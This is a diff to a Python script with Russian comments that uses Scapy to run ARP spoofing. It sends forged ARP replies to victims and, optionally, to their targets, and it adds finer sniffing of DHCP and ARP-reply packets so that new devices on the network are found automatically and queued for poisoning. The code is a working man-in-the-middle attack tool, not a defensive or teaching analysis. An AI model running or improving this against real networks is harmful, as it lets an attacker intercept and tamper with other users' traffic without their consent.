@@ -62,11 +62,11 @@ def arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac):
   пакет летит к target ip адресу (заранее разрешит его по arp-у сам (если не прописан заголовок Ethernet))
   """
     arp_to_victim_packet = Ether(dst=victim_mac) / ARP(op=2, psrc=target_ip, hwsrc=spoof_mac, hwdst=victim_mac)
-    sendp(arp_to_victim_packet, verbose=0, count=3)
+    sendp(arp_to_victim_packet, verbose=0, count=2)
 
     if bidirectional:
         arp_to_target_packet = Ether(dst=target_mac) / ARP(op=2, psrc=victim_ip, hwsrc=spoof_mac, hwdst=target_mac)
-        sendp(arp_to_target_packet, verbose=0, count=3)
+        sendp(arp_to_target_packet, verbose=0, count=2)
 
     if verbose_enabled:
         print(f"Был перехвачен кадр от {victim_ip} ({victim_mac}) -> к {target_ip} ({target_mac})")
@@ -97,19 +97,33 @@ def sniff_and_find_new_devices(interface="eth0", queue=None, pcap_name=""):
     def packet_handler(packet):
         nonlocal queue
 
-        if packet.haslayer(DHCP) or packet.haslayer(ARP):
+        if packet.haslayer(DHCP):
             # Извлекаем IP и MAC адреса
-            victim_ip = packet[IP].src if packet.haslayer(IP) else packet[ARP].psrc
-            victim_mac = packet[ARP].hwsrc if packet.haslayer(ARP) else packet[Ether].src
+            victim_ip = packet[IP].src
+            victim_mac = packet[Ether].src
 
-            target_ip = packet[IP].dst if packet.haslayer(IP) else packet[ARP].pdst
-            target_mac = packet[ARP].hwdst if packet.haslayer(ARP) else packet[Ether].dst
+            target_ip = packet[IP].dst
+            target_mac = packet[Ether].dst
 
             # Проверяем, является ли устройство новым
             if target_ip not in queue.queue:
                 # Добавляем устройство в очередь
                 queue.put((victim_ip, victim_mac))
                 queue.put((target_ip, target_mac))
+        elif packet.haslayer(ARP):
+            # Извлекаем IP и MAC адреса
+            if packet[ARP].op == 2:
+                victim_ip = packet[ARP].psrc
+                victim_mac = packet[ARP].hwsrc
+
+                target_ip =  packet[ARP].pdst
+                target_mac = packet[ARP].hwdst
+
+                # Проверяем, является ли устройство новым
+                if target_ip not in queue.queue:
+                    # Добавляем устройство в очередь
+                    queue.put((victim_ip, victim_mac))
+                    queue.put((target_ip, target_mac))
         elif packet.haslayer(IP):
             victim_ip = packet[IP].src if packet.haslayer(IP) else packet[ARP].psrc
             victim_mac = packet[ARP].hwsrc if packet.haslayer(ARP) else packet[Ether].src
@@ -371,3 +385,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+    
